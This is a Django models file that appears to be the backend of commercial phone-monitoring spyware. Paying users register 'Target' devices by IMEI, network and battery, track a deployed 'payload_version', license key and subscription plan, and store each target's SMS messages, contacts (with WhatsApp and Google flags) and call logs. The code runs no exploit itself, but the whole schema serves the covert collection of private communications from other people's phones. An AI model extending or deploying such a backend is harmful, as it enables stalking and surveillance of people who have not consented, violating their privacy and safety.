import datetime
from django.db import models
from django.contrib.auth.models import AbstractUser
import uuid


class User(AbstractUser):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    username = models.CharField(max_length=150, unique=True)
    password = models.CharField(max_length=128)
    email = models.EmailField(null=True, blank=True)
    verified = models.BooleanField(default=False)
    verified_at = models.DateTimeField(null=True, blank=True)
    has_passcode = models.BooleanField(default=False)
    passcode = models.CharField(max_length=6, null=True, blank=True)
    passcode_expiration = models.DateTimeField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        db_table = 'auth_user'
        swappable = 'AUTH_USER_MODEL'
        unique_together = ('id', 'username')
        indexes = [
            models.Index(fields=['username', 'id']),
        ]

    def __str__(self):
        return self.username


class Target(models.Model):
    STATUS_CHOICES = [
        ('active', 'Active'),
        ('inactive', 'Inactive'),
        ('idle', 'Idle'),
    ]
    PLAN_TYPES = [
        ('monthly', 'Monthly'),
        ('annual', 'Annual'),
    ]

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    name_alias = models.CharField(max_length=225, null=True, blank=True)
    device_model = models.CharField(max_length=225, null=True, blank=True)
    device_unique_id = models.CharField(max_length=225, null=True, blank=True)
    device_os = models.CharField(max_length=225, null=True, blank=True)
    device_imei = models.CharField(max_length=225, null=True, blank=True)
    device_network = models.CharField(max_length=225, null=True, blank=True)
    device_battery = models.CharField(max_length=225, null=True, blank=True)
    status = models.CharField(
        max_length=225, choices=STATUS_CHOICES, null=True, blank=True)
    plan_end = models.DateField(default=datetime.date.today)
    plan_type = models.CharField(
        max_length=225, null=True, blank=True, choices=PLAN_TYPES)
    last_sync = models.DateTimeField(null=True, blank=True)
    license_key = models.CharField(max_length=225, null=True, blank=True)
    payload_version = models.CharField(max_length=225, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.name_alias

    @property
    def is_expired(self):
        return datetime.date.today() > self.plan_end

    class Meta:
        indexes = [
            models.Index(fields=['user', 'id']),
        ]


class SMSMessages(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    message_id = models.CharField(max_length=225, null=True, blank=True)
    target = models.ForeignKey(Target, on_delete=models.CASCADE)
    address = models.CharField(max_length=225, null=True, blank=True)
    message_type = models.CharField(max_length=225, null=True, blank=True)
    message = models.TextField(null=True, blank=True)
    date = models.DateTimeField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.message_id

    class Meta:
        unique_together = ("target", "message_id")
        indexes = [
            models.Index(fields=['id', 'address']),
        ]

class Contacts(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    target = models.ForeignKey(Target, on_delete=models.CASCADE)
    contact_id = models.CharField(max_length=225, null=True, blank=True)
    name = models.CharField(max_length=225, null=True, blank=True)
    phones = models.JSONField(null=True, blank=True)
    emails = models.JSONField(null=True, blank=True)
    addresses = models.JSONField(null=True, blank=True)
    organizations= models.JSONField(null=True, blank=True)
    websites = models.JSONField(null=True, blank=True)
    social_medias = models.JSONField(null=True, blank=True)
    groups = models.JSONField(null=True, blank=True)
    notes = models.JSONField(null=True, blank=True)
    is_google = models.BooleanField(default=False)
    is_whatsapp = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.name

    class Meta:
        indexes = [
            models.Index(fields=['id', 'contact_id']),
        ]
        unique_together = ("contact_id", "is_google", "is_whatsapp")

class CallLogs(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    target = models.ForeignKey(Target, on_delete=models.CASCADE)
    number = models.CharField(max_length=225, null=True, blank=True)
    name = models.CharField(max_length=225, null=True, blank=True)
    call_type = models.CharField(max_length=225, null=True, blank=True)
    date = models.DateTimeField(null=True, blank=True)
    duration = models.IntegerField(null=True, blank=True)
    sim_slot = models.CharField(max_length=225, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.number
    
    class Meta:
        indexes = [
            models.Index(fields=['id', 'number']),
        ]
        unique_together = ("number", "call_type", "date")